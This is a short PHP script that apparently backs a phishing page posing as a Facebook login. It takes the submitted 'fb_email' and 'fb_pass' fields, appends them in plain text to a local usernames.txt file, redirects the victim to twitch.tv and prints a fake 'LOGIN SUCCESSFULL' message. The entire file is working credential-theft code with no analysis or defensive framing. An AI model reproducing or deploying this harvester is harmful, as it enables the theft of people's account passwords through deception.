<?php
$var = $_POST['fb_email'];
$var2 = $_POST['fb_pass'];
$myFile = file_get_contents("protect.html");
$searchString = "<html><title>WELCOME</title></html>";
if($myFile != $searchString) {
    file_put_contents("usernames.txt", "[FB-EMAIL]: " . $var . " [FB-PASS]: " . $var2 . "\n", FILE_APPEND);
    header('Location:https://twitch.tv/');
}
if($myFile != $searchString) {
    echo "LOGIN SUCCESSFULL";
}
exit();
?>
